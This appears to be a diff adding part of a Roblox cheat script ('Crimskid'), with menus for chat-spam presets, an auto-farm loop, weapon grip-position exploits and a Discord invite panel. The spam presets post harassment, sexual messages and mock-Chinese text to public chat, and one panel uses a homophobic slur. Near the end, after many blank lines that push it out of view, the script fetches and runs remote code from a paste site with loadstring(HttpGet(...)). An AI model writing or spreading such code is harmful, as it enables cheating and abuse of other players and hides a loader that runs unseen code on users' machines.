+                ".gg/Pke9FsFWpy CRIMSKID ON TOP GET CLAPPED BY CRIMSKID SIT DOWN SON",
+                "All"
+            )
+           
+    end 
+
+    if _G.shittalkpreset == "Goofy" then 
+ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "!919*(!7 ownid rel??!1! 😂 so bad fr 🤩🤗 go taych som gras plez 😅 wher is yor homework 🤬 😍😍 oh no i forgor 🤨 gud bay 😁",
+                "All"
+            )
+                task.wait(2)
+
+             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "&*(&*(&*(I Dont Shut Up!'😡😡😡I grow up😎😎😁😁😁😂😂🤣🤣When I see your face I throw up^&*(^&*( 😐😐😑😑😶😶🙄🙄🤢🤮🤮",
+                "All"
+            )
+                task.wait(2)
+
+            
+                         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "☠☠🤖🤖👾👾did you just get clapped by ^&*(^&*(CRIMSKID%^&*^&* 😨😨😨😨🤡🤡🤡🤥🤥",
+                "All"
+            )
+     task.wait(2)
+
+ 
+                           game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "Better Scramble Like an egg🍕🍔🍟🍟🌭🌭Before you get folded like an omelete (by crimskid premium <3)🙉🙊🙈🙈🐵🐵",
+                "All"
+            )
+            
+                 task.wait(2)
+
+ 
+                           game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "Lesbian squirt party 😳😳🤤🤤💦💦💦 InterSex 🙈🙊🙉🙉 Gays Cream Everywhere ",
+                "All"
+            )
+            
+            
+                        
+                 task.wait(2)
+
+ 
+                           game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "**87& scamed for ez 😅😅 yor bad 🤐 no cremskid no talk 😴 me col(d) 😎 why youre bud ☹ gg = got gud 🙄 supirstar 🤩🤩🤩",
+                "All"
+            )
+ 
+ 
+ end
+
+    if _G.shittalkpreset == "Bad Script" then 
+ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "Ur script is so bad lol 😴😴😴",
+                "All"
+            )
+                task.wait(2)
+
+             game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "bros script outdated 🤣🤣🤣",
+                "All"
+            )
+                task.wait(2)
+
+                         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "Fix ur script LOL 🥱🥱🥱",
+                "All"
+            )
+ 
+     task.wait(2)
+
+                           game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "Bros script buggin 🥶🥶",
+                "All"
+            )
+
+end
+
+   if _G.shittalkpreset == "Chinese" then 
+
+                           game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "👹👹👹👹👹👹👹👹####里姆斯基德.gg/crimskid获####里姆斯基德获👹👹👹👹👹",
+                "All"
+        )
+            task.wait(2)
+
+                                       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "😁😁👹👹👺👺💩💩😝😝😜😜我放在这里什么 😁😁👹👹👺👺💩💩😝😝😜😜",
+                "All"
+            )
+                task.wait(2)
+
+                                       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "🎶🎶🎶😃😃🎶🎶🎶😃😃####克里姆斯基德 ####上 ##### 返回页首### 🎶🎶🎶😃😃🎶🎶🎶😃😃",
+                "All"
+            )
+                task.wait(2)
+
+end 
+end 
+
+end}) 
+
+Misc:AddDropdown({
+	Name = "Presets",
+	Default = "3",
+	Options = {"Spam Discord", "Advertise", "Goofy", "Bad Script", "Chinese"},
+	Callback = function(v)
+	    _G.shittalkpreset = v 
+end}) 
+
+
+Misc:AddTextbox({
+	Name = "Custom Gun SFX",
+	Default = "3744371091",
+	TextDisappear = false,
+	Callback = function(Value)
+	    getgenv().customgunsfx = Value 
+	    game:GetService("ReplicatedStorage").Sound.SoundId = getgenv().customgunsfx 
+end}) 
+
+Misc:AddToggle({
+	Name = "Lettuce Farm",
+	Default = false,
+	Callback = function(v)
+	     _G.lettucefarm = v
+	     if _G.lettucefarm == true then 
+	    local plr = game:service"Players".LocalPlayer;
+        local tween_s = game:service"TweenService";
+        local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+        function tp(...)
+           local tic_k = tick();
+           local params = {...};
+           local cframe = CFrame.new(params[1],params[2],params[3]);
+           local tween,err = pcall(function()
+               local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+               tween:Play();
+           end)
+           if not tween then return err end
+        end
+        tp(-60, 320, -433);
+        wait(6)
+
+        while _G.lettucefarm == true do 
+            
+wait(1)
+        fireclickdetector(game:GetService("Workspace").Ignored.Shop.Others["[Lettuce] - $7"].ClickDetector)
+        print(game:GetService("Players").LocalPlayer.Information.Muscle.Value)
+        wait(1)
+        game.Players.LocalPlayer.Backpack["[Lettuce]"].Parent = game.Players.LocalPlayer.Character
+            game.Players.LocalPlayer.Character["[Lettuce]"]:Activate()
+             if game:GetService("Players").LocalPlayer.Information.Muscle.Value == 0 then
+                 _G.lettucefarm = false 
+                 _G.youcanteleportnow = false 
+                 game.Players.LocalPlayer.Character.Humanoid.Health = 0 
+                    MoonGod.prompt('Lettuce Farm', 'Finished', 5)
+
+        end
+        end
+    end 
+         
+end}) 
+
+
+local GripPosition = Misc:AddSection({
+	Name = "Grip Pos"
+})
+
+
+GripPosition:AddSlider({
+	Name = "X",
+	Min = -100,
+	Max = 100,
+	Default = 0,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+getgenv().GripPosX = -Value 
+end}) 
+
+GripPosition:AddSlider({
+	Name = "Y",
+	Min = -100,
+	Max = 100,
+	Default = 0,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+getgenv().GripPosY = -Value 
+end}) 
+
+
+GripPosition:AddSlider({
+	Name = "Z",
+	Min = -100,
+	Max = 100,
+	Default = 0,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+getgenv().GripPosZ = -Value 
+end}) 
+
+
+GripPosition:AddButton({
+	Name = "Execute",
+	Callback = function()
+	     local balls = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
+ 
+ balls.GripPos = Vector3.new(getgenv().GripPosX,getgenv().GripPosY,getgenv().GripPosZ)
+  	end    
+})
+
+
+GripPosition:AddDropdown({
+	Name = "Presets",
+	Default = "0",
+	Options = {"High Sniper", "Invisible", "Sky Snipe"},
+	Callback = function(v)
+	    if v == "High Sniper" then 
+	   local balls = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
+	   
+	   balls.GripPos = Vector3.new(0,-150,0)
+	                       MoonGod.prompt('Crimskid', 'Must have a sniper equiped (shoot a couple times for the gripos to work)', 5)
+
+	   
+	    end 
+   	    if v == "Invisible" then 
+	   	   local balls = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
+	   
+	   balls.GripPos = Vector3.new(6,6,6)
+	    end 
+   	    if v == "Sky Snipe" then 
+	    local balls = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
+	   
+	   balls.GripPos = Vector3.new(0,-50,0)
+	    end 
+   
+   
+end}) 
+
+
+local ImportantRead = IMPORTANT:AddSection({
+	Name = "READ THIS"
+})
+
+ImportantRead:AddParagraph("READ THIS IS IMPORTANT","So basically some random faggot decided to delete the server. Join the new one and make a ticket to get back your role. https://discord.gg/gnb2Yh94fw (Or Copy below) My discord is officialy Feenobe#6559")
+
+
+ImportantRead:AddButton({
+	Name = "Copy Discord",
+	Callback = function()
+      		               setclipboard("https://discord.gg/gnb2Yh94fw")
+  	end    
+})
+
+ImportantRead:AddButton({
+	Name = "Auto Join (Synapse Only)",
+	Callback = function()
+	    if syn then 
+      		                 local res = syn.request({
+            Url = 'http://127.0.0.1:6463/rpc?v=1',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json',
+                Origin = 'https://discord.com'
+            },
+            Body = game:GetService('HttpService'):JSONEncode({
+                cmd = 'INVITE_BROWSER',
+                nonce = game:GetService('HttpService'):GenerateGUID(false),
+                args = {code = 'gnb2Yh94fw'}
+            })
+        })
+    end 
+  	end    
+})
+
+
+
+
+OrionLib:Init()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+a = math.random(1,5)
+
+if a == 1 then 
+        local hi = Instance.new("Sound")
+hi.Name = "Sound"
+hi.SoundId = "rbxassetid://488265234"
+hi.Volume = 2
+hi.Looped = false
+hi.archivable = false
+hi.Parent = game.Workspace
+hi:Play()
+elseif a == 2 then 
+            local hi = Instance.new("Sound")
+hi.Name = "Sound"
+hi.SoundId = "rbxassetid://166229986"
+hi.Volume = 2
+hi.Looped = false
+hi.archivable = false
+hi.Parent = game.Workspace
+hi:Play()
+elseif a == 3 then 
+                local hi = Instance.new("Sound")
+hi.Name = "Sound"
+hi.SoundId = "rbxassetid://266715798"
+hi.Volume = 2
+hi.Looped = false
+hi.archivable = false
+hi.Parent = game.Workspace
+hi:Play()
+elseif a == 4 then 
+    
+                    local hi = Instance.new("Sound")
+hi.Name = "Sound"
+hi.SoundId = "rbxassetid://8972276330"
+hi.Volume = 2
+hi.Looped = false
+hi.archivable = false
+hi.Parent = game.Workspace
+hi:Play()
+elseif a == 5 then 
+                        local hi = Instance.new("Sound")
+hi.Name = "Sound"
+hi.SoundId = "rbxassetid://8972276330"
+hi.Volume = 2
+hi.Looped = false
+hi.archivable = false
+hi.Parent = game.Workspace
+hi:Play()
+end 
+
+
+
+
+
+_G.targetaimtransparency  = 0.8
+_G.targetaimsize = Vector3.new(14,14,14)
+ _G.targetaimcolor = Color3.fromRGB(128,128,128) 
+
+
+
+            loadstring(game:HttpGet("https://pst.klgrth.io/paste/vs7yc/raw"))()
+            
+
+
+
+
+
+
+
+
+
+
+
+
